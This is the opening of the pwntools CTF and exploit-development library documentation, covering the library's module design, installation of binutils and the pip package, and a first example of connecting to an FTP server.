

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>pwntools 3.10.0 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  

  
    <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
  

  
        <link rel="author" title="About these documents"
              href="index.html#document-about"/>
        <link rel="index" title="Index"
              href="genindex.html"/>
        <link rel="search" title="Search" href="search.html"/>
    <link rel="top" title="None" href="index.html#document-index"/> 

  
  <script src="_static/js/modernizr.min.js"></script>


<!-- RTD Extra Head -->

<!-- 
Always link to the latest version, as canonical.
http://docs.readthedocs.org/en/latest/canonical.html
-->
<link rel="canonical" href="http://docs.pwntools.com/en/stable/" />

<link rel="stylesheet" href="https://media.readthedocs.org/css/readthedocs-doc-embed.css" type="text/css" />

<script type="text/javascript" src="_static/readthedocs-data.js"></script>

<!-- Add page-specific data, which must exist in the page js, not global -->
<script type="text/javascript">
READTHEDOCS_DATA['page'] = 'index'
</script>

<script type="text/javascript" src="_static/readthedocs-dynamic-include.js"></script>

<!-- end RTD <extrahead> --></head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="index.html#document-index" class="icon icon-home"> pwntools
          

          
          </a>

          
            
            
            
              <div class="version">
                stable
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
            
              <!-- Local TOC -->
              <div class="local-toc"><ul>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-about">About pwntools</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#module-pwn"><code class="docutils literal"><span class="pre">pwn</span></code> &#8212; Toolbox optimized for CTFs</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#module-pwnlib"><code class="docutils literal"><span class="pre">pwnlib</span></code> &#8212; Normal python library</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-install">Installation</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#prerequisites">Prerequisites</a><ul>
<li class="toctree-l3"><a class="reference internal" href="index.html#document-install/binutils">Binutils</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#document-install/headers">Python Development Headers</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="index.html#released-version">Released Version</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#development">Development</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-intro">Getting Started</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#making-connections">Making Connections</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#packing-integers">Packing Integers</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#setting-the-target-architecture-and-os">Setting the Target Architecture and OS</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#setting-logging-verbosity">Setting Logging Verbosity</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#assembly-and-disassembly">Assembly and Disassembly</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#misc-tools">Misc Tools</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#elf-manipulation">ELF Manipulation</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-globals"><code class="docutils literal"><span class="pre">from</span> <span class="pre">pwn</span> <span class="pre">import</span> <span class="pre">*</span></code></a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-commandline">Command Line Tools</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#pwn">pwn</a><ul>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-asm">pwn asm</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-checksec">pwn checksec</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-constgrep">pwn constgrep</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-cyclic">pwn cyclic</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-debug">pwn debug</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-disablenx">pwn disablenx</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-disasm">pwn disasm</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-elfdiff">pwn elfdiff</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-elfpatch">pwn elfpatch</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-errno">pwn errno</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-hex">pwn hex</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-phd">pwn phd</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-pwnstrip">pwn pwnstrip</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-scramble">pwn scramble</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-shellcraft">pwn shellcraft</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-template">pwn template</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-unhex">pwn unhex</a></li>
<li class="toctree-l3"><a class="reference internal" href="index.html#pwn-update">pwn update</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-adb"><code class="docutils literal"><span class="pre">pwnlib.adb</span></code> &#8212; Android Debug Bridge</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-args"><code class="docutils literal"><span class="pre">pwnlib.args</span></code> &#8212; Magic Command-Line Arguments</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-asm"><code class="docutils literal"><span class="pre">pwnlib.asm</span></code> &#8212; Assembler functions</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-atexception"><code class="docutils literal"><span class="pre">pwnlib.atexception</span></code> &#8212; Callbacks on unhandled exception</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-atexit"><code class="docutils literal"><span class="pre">pwnlib.atexit</span></code> &#8212; Replacement for atexit</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-constants"><code class="docutils literal"><span class="pre">pwnlib.constants</span></code> &#8212; Easy access to header file constants</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-config"><code class="docutils literal"><span class="pre">pwnlib.config</span></code> &#8212; Pwntools Configuration File</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-context"><code class="docutils literal"><span class="pre">pwnlib.context</span></code> &#8212; Setting runtime variables</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-dynelf"><code class="docutils literal"><span class="pre">pwnlib.dynelf</span></code> &#8212; Resolving remote functions using leaks</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-encoders"><code class="docutils literal"><span class="pre">pwnlib.encoders</span></code> &#8212; Encoding Shellcode</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-elf"><code class="docutils literal"><span class="pre">pwnlib.elf</span></code> &#8212; ELF Executables and Libraries</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-exception"><code class="docutils literal"><span class="pre">pwnlib.exception</span></code> &#8212; Pwnlib exceptions</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-flag"><code class="docutils literal"><span class="pre">pwnlib.flag</span></code> &#8212; CTF Flag Management</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-fmtstr"><code class="docutils literal"><span class="pre">pwnlib.fmtstr</span></code> &#8212; Format string bug exploitation tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-gdb"><code class="docutils literal"><span class="pre">pwnlib.gdb</span></code> &#8212; Working with GDB</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-libcdb"><code class="docutils literal"><span class="pre">pwnlib.libcdb</span></code> &#8212; Libc Database</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-log"><code class="docutils literal"><span class="pre">pwnlib.log</span></code> &#8212; Logging stuff</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-memleak"><code class="docutils literal"><span class="pre">pwnlib.memleak</span></code> &#8212; Helper class for leaking memory</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-protocols"><code class="docutils literal"><span class="pre">pwnlib.protocols</span></code> &#8212; Wire Protocols</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-replacements"><code class="docutils literal"><span class="pre">pwnlib.replacements</span></code> &#8212; Replacements for various functions</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-rop"><code class="docutils literal"><span class="pre">pwnlib.rop</span></code> &#8212; Return Oriented Programming</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-rop/rop"><code class="docutils literal"><span class="pre">pwnlib.rop.rop</span></code> &#8212; Return Oriented Programming</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-rop/srop"><code class="docutils literal"><span class="pre">pwnlib.rop.srop</span></code> &#8212; Sigreturn Oriented Programming</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-runner"><code class="docutils literal"><span class="pre">pwnlib.runner</span></code> &#8212; Running Shellcode</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-shellcraft"><code class="docutils literal"><span class="pre">pwnlib.shellcraft</span></code> &#8212; Shellcode generation</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-shellcraft/aarch64"><code class="docutils literal"><span class="pre">pwnlib.shellcraft.aarch64</span></code> &#8212; Shellcode for AArch64</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-shellcraft/amd64"><code class="docutils literal"><span class="pre">pwnlib.shellcraft.amd64</span></code> &#8212; Shellcode for AMD64</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-shellcraft/arm"><code class="docutils literal"><span class="pre">pwnlib.shellcraft.arm</span></code> &#8212; Shellcode for ARM</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-shellcraft/common"><code class="docutils literal"><span class="pre">pwnlib.shellcraft.common</span></code> &#8212; Shellcode common to all architecture</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-shellcraft/i386"><code class="docutils literal"><span class="pre">pwnlib.shellcraft.i386</span></code> &#8212; Shellcode for Intel 80386</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-shellcraft/mips"><code class="docutils literal"><span class="pre">pwnlib.shellcraft.mips</span></code> &#8212; Shellcode for MIPS</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-shellcraft/regsort"><code class="docutils literal"><span class="pre">pwnlib.regsort</span></code> &#8212; Register sorting</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-shellcraft/thumb"><code class="docutils literal"><span class="pre">pwnlib.shellcraft.thumb</span></code> &#8212; Shellcode for Thumb Mode</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-term"><code class="docutils literal"><span class="pre">pwnlib.term</span></code> &#8212; Terminal handling</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-timeout"><code class="docutils literal"><span class="pre">pwnlib.timeout</span></code> &#8212; Timeout handling</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-tubes"><code class="docutils literal"><span class="pre">pwnlib.tubes</span></code> &#8212; Talking to the World!</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-tubes/processes"><code class="docutils literal"><span class="pre">pwnlib.tubes.process</span></code> &#8212; Processes</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-tubes/serial"><code class="docutils literal"><span class="pre">pwnlib.tubes.serialtube</span></code> &#8212; Serial Ports</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-tubes/sockets"><code class="docutils literal"><span class="pre">pwnlib.tubes.sock</span></code> &#8212; Sockets</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-tubes/ssh"><code class="docutils literal"><span class="pre">pwnlib.tubes.ssh</span></code> &#8212; SSH</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-ui"><code class="docutils literal"><span class="pre">pwnlib.ui</span></code> &#8212; Functions for user interaction</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-update"><code class="docutils literal"><span class="pre">pwnlib.update</span></code> &#8212; Updating Pwntools</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-useragents"><code class="docutils literal"><span class="pre">pwnlib.useragents</span></code> &#8212; A database of useragent strings</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-util/crc"><code class="docutils literal"><span class="pre">pwnlib.util.crc</span></code> &#8212; Calculating CRC-sums</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-util/cyclic"><code class="docutils literal"><span class="pre">pwnlib.util.cyclic</span></code> &#8212; Generation of unique sequences</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-util/fiddling"><code class="docutils literal"><span class="pre">pwnlib.util.fiddling</span></code> &#8212; Utilities bit fiddling</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-util/hashes"><code class="docutils literal"><span class="pre">pwnlib.util.hashes</span></code> &#8212; Hashing functions</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-util/iters"><code class="docutils literal"><span class="pre">pwnlib.util.iters</span></code> &#8212; Extension of standard module <code class="docutils literal"><span class="pre">itertools</span></code></a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-util/lists"><code class="docutils literal"><span class="pre">pwnlib.util.lists</span></code> &#8212; Operations on lists</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-util/misc"><code class="docutils literal"><span class="pre">pwnlib.util.misc</span></code> &#8212; We could not fit it any other place</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-util/net"><code class="docutils literal"><span class="pre">pwnlib.util.net</span></code> &#8212; Networking interfaces</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-util/packing"><code class="docutils literal"><span class="pre">pwnlib.util.packing</span></code> &#8212; Packing and unpacking of strings</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-util/proc"><code class="docutils literal"><span class="pre">pwnlib.util.proc</span></code> &#8212; Working with <code class="docutils literal"><span class="pre">/proc/</span></code></a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-util/safeeval"><code class="docutils literal"><span class="pre">pwnlib.util.safeeval</span></code> &#8212; Safe evaluation of python code</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-util/sh_string"><code class="docutils literal"><span class="pre">pwnlib.util.sh_string</span></code> &#8212; Shell Expansion is Hard</a></li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-util/web"><code class="docutils literal"><span class="pre">pwnlib.util.web</span></code> &#8212; Utilities for working with the WWW</a></li>
</ul>
<ul>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-testexample"><code class="docutils literal"><span class="pre">pwnlib.testexample</span></code> &#8212; Example Test Module</a></li>
</ul>
</div>
            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="index.html#document-index">pwntools</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="index.html#document-index">Docs</a> &raquo;</li>
        
      <li>pwntools 3.10.0 documentation</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            
              <a href="https://github.com/Gallopsled/pwntools/blob/origin/stable/docs/source/index.rst" class="fa fa-github"> Edit on GitHub</a>
            
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="pwntools">
<h1>pwntools<a class="headerlink" href="#pwntools" title="Permalink to this headline">¶</a></h1>
<p><code class="docutils literal"><span class="pre">pwntools</span></code> is a CTF framework and exploit development library.
Written in Python, it is designed for rapid prototyping and development,
and intended to make exploit writing as simple as possible.</p>
<p>The primary location for this documentation is at <a class="reference external" href="https://docs.pwntools.com">docs.pwntools.com</a>, which uses
<a class="reference external" href="https://readthedocs.org">readthedocs</a>. It comes in three primary flavors:</p>
<ul class="simple">
<li><a class="reference external" href="https://docs.pwntools.com/en/stable">Stable</a></li>
<li><a class="reference external" href="https://docs.pwntools.com/en/beta">Beta</a></li>
<li><a class="reference external" href="https://docs.pwntools.com/en/dev">Dev</a></li>
</ul>
<div class="section" id="getting-started">
<h2>Getting Started<a class="headerlink" href="#getting-started" title="Permalink to this headline">¶</a></h2>
<div class="toctree-wrapper compound">
<span id="document-about"></span><div class="section" id="about-pwntools">
<h3>About pwntools<a class="headerlink" href="#about-pwntools" title="Permalink to this headline">¶</a></h3>
<p>Whether you&#8217;re using it to write exploits, or as part
of another software project will dictate how you use it.</p>
<p>Historically pwntools was used as a sort of exploit-writing DSL. Simply doing
<code class="docutils literal"><span class="pre">from</span> <span class="pre">pwn</span> <span class="pre">import</span> <span class="pre">*</span></code> in a previous version of pwntools would bring all sorts of
nice side-effects.</p>
<p>When redesigning pwntools for 2.0, we noticed two contrary goals:</p>
<ul class="simple">
<li>We would like to have a &#8220;normal&#8221; python module structure, to allow other
people to familiarize themselves with pwntools quickly.</li>
<li>We would like to have even more side-effects, especially by putting the
terminal in raw-mode.</li>
</ul>
<p>To make this possible, we decided to have two different modules. <a class="reference internal" href="#module-pwnlib" title="pwnlib"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib</span></code></a>
would be our nice, clean Python module, while <a class="reference internal" href="#module-pwn" title="pwn"><code class="xref py py-mod docutils literal"><span class="pre">pwn</span></code></a> would be used during
CTFs.</p>
<div class="section" id="module-pwn">
<span id="pwn-toolbox-optimized-for-ctfs"></span><h4><a class="reference internal" href="#module-pwn" title="pwn"><code class="xref py py-mod docutils literal"><span class="pre">pwn</span></code></a> &#8212; Toolbox optimized for CTFs<a class="headerlink" href="#module-pwn" title="Permalink to this headline">¶</a></h4>
<p>As stated, we would also like to have the ability to get a lot of these
side-effects by default. That is the purpose of this module. It does
the following:</p>
<ul class="simple">
<li>Imports everything from the toplevel <a class="reference internal" href="#module-pwnlib" title="pwnlib"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib</span></code></a> along with
functions from a lot of submodules. This means that if you do
<code class="docutils literal"><span class="pre">import</span> <span class="pre">pwn</span></code> or <code class="docutils literal"><span class="pre">from</span> <span class="pre">pwn</span> <span class="pre">import</span> <span class="pre">*</span></code>, you will have access to
everything you need to write an exploit.</li>
<li>Calls <a class="reference internal" href="index.html#pwnlib.term.init" title="pwnlib.term.init"><code class="xref py py-func docutils literal"><span class="pre">pwnlib.term.init()</span></code></a> to put your terminal in raw mode
and implements functionality to make it appear like it isn&#8217;t.</li>
<li>Setting the <code class="xref py py-data docutils literal"><span class="pre">pwnlib.context.log_level</span></code> to <cite>&#8220;info&#8221;</cite>.</li>
<li>Tries to parse some of the values in <a class="reference external" href="https://docs.python.org/2.7/library/sys.html#sys.argv" title="(in Python v2.7)"><code class="xref py py-data docutils literal"><span class="pre">sys.argv</span></code></a> and every
value it succeeds in parsing it removes.</li>
</ul>
</div>
<div class="section" id="module-pwnlib">
<span id="pwnlib-normal-python-library"></span><h4><a class="reference internal" href="#module-pwnlib" title="pwnlib"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib</span></code></a> &#8212; Normal python library<a class="headerlink" href="#module-pwnlib" title="Permalink to this headline">¶</a></h4>
<p>This module is our &#8220;clean&#8221; python-code. As a rule, we do not think that
importing <a class="reference internal" href="#module-pwnlib" title="pwnlib"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib</span></code></a> or any of the submodules should have any significant
side-effects (besides e.g. caching).</p>
<p>For the most part, you will also only get the bits you import. You for instance
not get access to <a class="reference internal" href="index.html#module-pwnlib.util.packing" title="pwnlib.util.packing"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.packing</span></code></a> simply by doing <code class="docutils literal"><span class="pre">import</span>
<span class="pre">pwnlib.util</span></code>.</p>
<p>Though there are a few exceptions (such as <a class="reference internal" href="index.html#module-pwnlib.shellcraft" title="pwnlib.shellcraft"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft</span></code></a>), that does
not quite fit the goals of being simple and clean, but they can still be
imported without implicit side-effects.</p>
</div>
</div>
<span id="document-install"></span><div class="section" id="installation">
<h3>Installation<a class="headerlink" href="#installation" title="Permalink to this headline">¶</a></h3>
<p>pwntools is best supported on Ubuntu 12.04 and 14.04, but most
functionality should work on any Posix-like distribution (Debian, Arch,
FreeBSD, OSX, etc.).</p>
<div class="section" id="prerequisites">
<h4>Prerequisites<a class="headerlink" href="#prerequisites" title="Permalink to this headline">¶</a></h4>
<p>In order to get the most out of <code class="docutils literal"><span class="pre">pwntools</span></code>, you should have the
following system libraries installed.</p>
<div class="toctree-wrapper compound">
<span id="document-install/binutils"></span><div class="section" id="binutils">
<h5>Binutils<a class="headerlink" href="#binutils" title="Permalink to this headline">¶</a></h5>
<p>Assembly of foreign architectures (e.g. assembling Sparc shellcode on
Mac OS X) requires cross-compiled versions of <code class="docutils literal"><span class="pre">binutils</span></code> to be
installed. We&#8217;ve made this process as smooth as we can.</p>
<p>In these examples, replace <code class="docutils literal"><span class="pre">$ARCH</span></code> with your target architecture (e.g., arm, mips64, vax, etc.).</p>
<p>Building <cite>binutils</cite> from source takes about 60 seconds on a modern 8-core machine.</p>
<div class="section" id="ubuntu">
<h6>Ubuntu<a class="headerlink" href="#ubuntu" title="Permalink to this headline">¶</a></h6>
<p>For Ubuntu 12.04 through 15.10, you must first add the pwntools <a class="reference external" href="http://binutils.pwntools.com">Personal Package Archive repository</a>.</p>
<p>Ubuntu Xenial (16.04) has official packages for most architectures, and does not require this step.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>$ apt-get install software-properties-common
$ apt-add-repository ppa:pwntools/binutils
$ apt-get update
</pre></div>
</div>
<p>Then, install the binutils for your architecture.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>$ apt-get install binutils-<span class="nv">$ARCH</span>-linux-gnu
</pre></div>
</div>
</div>
<div class="section" id="mac-os-x">
<h6>Mac OS X<a class="headerlink" href="#mac-os-x" title="Permalink to this headline">¶</a></h6>
<p>Mac OS X is just as easy, but requires building binutils from source.
However, we&#8217;ve made <code class="docutils literal"><span class="pre">homebrew</span></code> recipes to make this a single command.
After installing <a class="reference external" href="http://brew.sh">brew</a>, grab the appropriate
recipe from our <a class="reference external" href="https://github.com/Gallopsled/pwntools-binutils/">binutils
repo</a>.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>$ brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-<span class="nv">$ARCH</span>.rb
</pre></div>
</div>
</div>
<div class="section" id="alternate-oses">
<h6>Alternate OSes<a class="headerlink" href="#alternate-oses" title="Permalink to this headline">¶</a></h6>
<p>If you want to build everything by hand, or don&#8217;t use any of the above
OSes, <code class="docutils literal"><span class="pre">binutils</span></code> is simple to build by hand.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="nv">V</span><span class="o">=</span><span class="m">2</span>.25   <span class="c1"># Binutils Version</span>
<span class="nv">ARCH</span><span class="o">=</span>arm <span class="c1"># Target architecture</span>

<span class="nb">cd</span> /tmp
wget -nc https://ftp.gnu.org/gnu/binutils/binutils-<span class="nv">$V</span>.tar.gz
wget -nc https://ftp.gnu.org/gnu/binutils/binutils-<span class="nv">$V</span>.tar.gz.sig

gpg --keyserver keys.gnupg.net --recv-keys 4AE55E93
gpg --verify binutils-<span class="nv">$V</span>.tar.gz.sig

tar xf binutils-<span class="nv">$V</span>.tar.gz

mkdir binutils-build
<span class="nb">cd</span> binutils-build

<span class="nb">export</span> <span class="nv">AR</span><span class="o">=</span>ar
<span class="nb">export</span> <span class="nv">AS</span><span class="o">=</span>as

../binutils-<span class="nv">$V</span>/configure <span class="se">\</span>
    --prefix<span class="o">=</span>/usr/local <span class="se">\</span>
    --target<span class="o">=</span><span class="nv">$ARCH</span>-unknown-linux-gnu <span class="se">\</span>
    --disable-static <span class="se">\</span>
    --disable-multilib <span class="se">\</span>
    --disable-werror <span class="se">\</span>
    --disable-nls

<span class="nv">MAKE</span><span class="o">=</span>gmake
<span class="nb">hash</span> gmake <span class="o">||</span> <span class="nv">MAKE</span><span class="o">=</span>make

<span class="nv">$MAKE</span> -j clean all
sudo <span class="nv">$MAKE</span> install
</pre></div>
</div>
</div>
</div>
<span id="document-install/headers"></span><div class="section" id="python-development-headers">
<h5>Python Development Headers<a class="headerlink" href="#python-development-headers" title="Permalink to this headline">¶</a></h5>
<p>Some of pwntools&#8217; Python dependencies require native extensions (for example, Paramiko requires PyCrypto).</p>
<p>In order to build these native extensions, the development headers for Python must be installed.</p>
<div class="section" id="ubuntu">
<h6>Ubuntu<a class="headerlink" href="#ubuntu" title="Permalink to this headline">¶</a></h6>
<div class="highlight-bash"><div class="highlight"><pre><span></span>$ apt-get install python-dev
</pre></div>
</div>
</div>
<div class="section" id="mac-os-x">
<h6>Mac OS X<a class="headerlink" href="#mac-os-x" title="Permalink to this headline">¶</a></h6>
<p>No action needed.</p>
</div>
</div>
</div>
</div>
<div class="section" id="released-version">
<h4>Released Version<a class="headerlink" href="#released-version" title="Permalink to this headline">¶</a></h4>
<p>pwntools is available as a <code class="docutils literal"><span class="pre">pip</span></code> package.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>$ apt-get update
$ apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential
$ pip install --upgrade pip
$ pip install --upgrade pwntools
</pre></div>
</div>
</div>
<div class="section" id="development">
<h4>Development<a class="headerlink" href="#development" title="Permalink to this headline">¶</a></h4>
<p>If you are hacking on Pwntools locally, you&#8217;ll want to do something like this:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>$ git clone https://github.com/Gallopsled/pwntools
$ pip install --upgrade --editable ./pwntools
</pre></div>
</div>
</div>
</div>
<span id="document-intro"></span><div class="section" id="getting-started">
<h3>Getting Started<a class="headerlink" href="#getting-started" title="Permalink to this headline">¶</a></h3>
<p>To get your feet wet with pwntools, let&#8217;s first go through a few examples.</p>
<p>When writing exploits, pwntools generally follows the &#8220;kitchen sink&#8221; approach.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
</pre></div>
</div>
<p>This imports a lot of functionality into the global namespace.  You can now
assemble, disassemble, pack, unpack, and many other things with a single function.</p>
<p>A full list of everything that is imported is available on <a class="reference internal" href="index.html#document-globals"><span class="doc">from pwn import *</span></a>.</p>
<div class="section" id="making-connections">
<h4>Making Connections<a class="headerlink" href="#making-connections" title="Permalink to this headline">¶</a></h4>
<p>You need to talk to the challenge binary in order to pwn it, right?
pwntools makes this stupid simple with its <a class="reference internal" href="index.html#module-pwnlib.tubes" title="pwnlib.tubes"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.tubes</span></code></a> module.</p>
<p>This exposes a standard interface to talk to processes, sockets, serial ports,
and all manner of things, along with some nifty helpers for common tasks.
For example, remote connections via <a class="reference internal" href="index.html#module-pwnlib.tubes.remote" title="pwnlib.tubes.remote"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.tubes.remote</span></code></a>.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;ftp.debian.org&#39;</span><span class="p">,</span><span class="mi">21</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> 
<span class="go">&#39;220 ...&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;USER anonymous</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;331&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Please specify the password.\r\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
</div>
<p>It&#8217;s also easy to spin up a listener</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">()</span>
